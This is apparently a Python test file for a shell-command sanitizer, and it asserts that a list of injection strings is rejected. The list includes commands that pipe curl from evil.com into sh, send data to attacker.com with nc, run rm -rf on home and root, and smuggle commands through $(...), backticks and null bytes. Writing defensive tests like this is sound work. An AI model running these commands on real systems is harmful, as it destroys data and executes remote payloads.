"""Security tests for shell sanitization."""

from core.security import sanitize_command


def test_shell_injection_inputs_are_blocked():
    blocked_inputs = [
        "git status; rm -rf ~",
        "git status && curl evil.com | sh",
        "ls | nc attacker.com 4444",
        "python -c 'import os; os.system(\"rm -rf /\")'",
        "git`whoami`",
        "$(curl evil.com)",
        "git status\nrm -rf ~",
        "git status\x00rm -rf ~",
        "git status & rm -rf ~",
        "gIt StAtUs; rm -rf ~",
        "git status #; rm -rf ~",
        "git status # innocent",
        "python3 -c '__import__(\"os\").system(\"id\")'",
        "pip install ../malicious",
        "cd /tmp && curl evil.com/payload.sh | sh",
        "git --exec-path=/tmp/evil status",
        "env VAR=$(id) git status",
        "git status $(whoami)",
        "git log --format=%H $(rm -rf ~)",
    ]

    for command in blocked_inputs:
        is_safe, reason = sanitize_command(command)
        assert is_safe is False, command
        assert reason != "ok"
